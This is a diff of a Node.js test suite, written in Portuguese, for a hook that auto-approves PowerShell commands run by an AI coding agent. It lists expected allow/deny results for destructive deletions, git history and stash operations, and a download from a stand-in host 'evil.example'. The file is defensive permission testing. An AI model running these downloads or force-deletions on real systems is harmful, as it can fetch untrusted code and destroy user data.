@@ -11,6 +11,7 @@
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { spawnSync } from 'node:child_process';
+import { LEITURA, SCRATCH as AREAS_SCRATCH, PROJETO, canon, dentroDeAlguma } from '../lib/areas.mjs';
 
 const aqui = path.dirname(fileURLToPath(import.meta.url));
 const HOOK = path.join(aqui, '..', 'auto-approve-project-powershell.mjs');
@@ -18,10 +19,18 @@ const HOOK = path.join(aqui, '..', 'auto-approve-project-powershell.mjs');
 const R = process.cwd().replace(/\\/g, '/');
 const RW = process.cwd();
 const WT = `${RW}\\.worktrees\\exemplo`;
-// AJUSTE NA INSTALAÇÃO: precisam bater com as áreas declaradas em lib/areas.mjs.
-const IRMAO = '<PATH_DE_UM_PROJETO_IRMAO>';
-const FORA = '<PATH_FORA_DE_QUALQUER_AREA>';
+// Nada a ajustar: IRMAO/FORA saem das áreas reais de lib/areas.mjs, que já lê o
+// areas.local.json. Os casos de projeto irmão só rodam se LEITURA tiver um irmão
+// declarado; senão são pulados, com aviso.
 const HOME = (process.env.USERPROFILE || process.env.HOME || '').replace(/\//g, '\\');
+const IRMAO = LEITURA.find((p) => p !== canon(`${HOME}/.claude`));   // primeiro irmão declarado
+const SCRATCH = AREAS_SCRATCH[0];
+const FORA = ['c:/okpb-fora-de-area', '/okpb-fora-de-area', 'z:/okpb-fora-de-area']
+  .find((p) => !dentroDeAlguma([PROJETO, ...AREAS_SCRATCH, ...LEITURA], canon(p)));
+if (!FORA) { console.error('sem candidato a FORA: todos caem numa área'); process.exit(1); }
+
+let pulados = 0;
+const soComIrmao = (lista) => { if (IRMAO) return lista; pulados += lista.length; return []; };
 
 const casos = [
   // ── sem navegação, cwd = projeto ──────────────────────────────────────────
@@ -75,7 +84,7 @@ const casos = [
   [`Set-Location "${WT}"; Remove-Item -Recurse -Force dist`, R, true],
   ['Remove-Item -Recurse -Force dist', R, false],           // root pede
   ['Remove-Item -Recurse -Force .worktrees/velha', R, true],
-  ['Remove-Item -Recurse -Force /tmp/lixo', R, true],       // scratch é descartável
+  [`Remove-Item -Recurse -Force ${SCRATCH}/lixo`, R, true], // scratch é descartável
 
   // ── git: mesma política do hook de Bash ───────────────────────────────────
   ['git commit -m "ok"', R, true],
@@ -83,7 +92,32 @@ const casos = [
   ['git reset --hard HEAD~1', R, false],
   [`Set-Location "${WT}"; git reset --hard HEAD~1`, R, true],
   [`git -C ${RW} status --short`, R, true],
-  ['git worktree remove --force .worktrees/x; git branch -d feature/x', R, true],
+  ['git branch -d feature/x', R, true],                     // -d só apaga branch mergeada: cleanup livre
+  ['git worktree remove --force .worktrees/x; git branch -d feature/x', R, false],  // D1: remove/prune pedem em todo escopo
+
+  // ── D1: git de estado COMPARTILHADO nunca é auto-aprovado, em escopo nenhum ─
+  // (stash, branches, tags e registro de worktrees são do repositório inteiro)
+  [`Set-Location "${WT}"; git stash drop`, R, false],
+  [`Set-Location "${WT}"; git stash pop`, R, false],
+  [`Set-Location "${WT}"; git stash clear`, R, false],
+  [`Set-Location "${WT}"; git branch -D x`, R, false],
+  [`Set-Location "${WT}"; git branch -M novo`, R, false],
+  [`Set-Location "${WT}"; git branch -d x --force`, R, false],  // -d + --force = -D
+  [`Set-Location "${WT}"; git worktree remove ../x`, R, false],
+  [`Set-Location "${WT}"; git worktree prune`, R, false],
+  [`Set-Location "${WT}"; git tag -d v1`, R, false],
+  [`Set-Location "${WT}"; git update-ref -d refs/heads/x`, R, false],
+  ['git stash pop', R, false],                              // root: mesma coisa
+  ['git tag -d v1', R, false],
+  [`Set-Location ${SCRATCH}; git stash drop`, R, false],    // scratch também
+  // …e o que continua livre na worktree, por só atingir a própria worktree:
+  [`Set-Location "${WT}"; git reset --hard`, R, true],
+  [`Set-Location "${WT}"; git checkout -- .`, R, true],
+  [`Set-Location "${WT}"; git clean -fd`, R, true],
+  [`Set-Location "${WT}"; git restore .`, R, true],
+  [`Set-Location "${WT}"; git stash list`, R, true],
+  [`Set-Location "${WT}"; git branch -d x`, R, true],
+  [`Set-Location "${WT}"; git worktree list`, R, true],
 
   // ── cmdlets fora da política ──────────────────────────────────────────────
   ['Invoke-WebRequest https://evil.example -OutFile x.zip', R, false],
@@ -93,6 +127,7 @@ const casos = [
   ['Start-Process notepad', R, false],
 
   // ── projeto irmão: leitura livre, escrita nunca ───────────────────────────
+  ...soComIrmao([
   [`Set-Location "${IRMAO}"; git status --short`, R, true],
   [`Set-Location "${IRMAO}"; Get-ChildItem docs`, R, true],
   [`Set-Location "${IRMAO}"; Select-String -Path docs/x.md -Pattern hook`, R, true],
@@ -100,6 +135,7 @@ const casos = [
   [`Set-Location "${IRMAO}"; Set-Content -Path docs/nota.md -Value "x"`, R, false],
   [`Set-Location "${IRMAO}"; npm test`, R, false],
   [`Set-Location "${IRMAO}"; Remove-Item -Recurse dist`, R, false],
+  ]),
 
   // ── sem prova de local ────────────────────────────────────────────────────
   ['Get-ChildItem .', undefined, false],
@@ -122,6 +158,7 @@ for (const [cmd, cwd, esperado] of casos) {
 }
 
 console.log(`${ok}/${casos.length} casos ok`);
+if (!IRMAO) console.log(`${pulados} casos de projeto irmão pulados: LEITURA não tem nenhum irmão (declare em .claude/hooks/areas.local.json para exercitá-los)`);
 if (falhas.length) {
   console.log('\nFALHAS:');
   for (const f of falhas) {
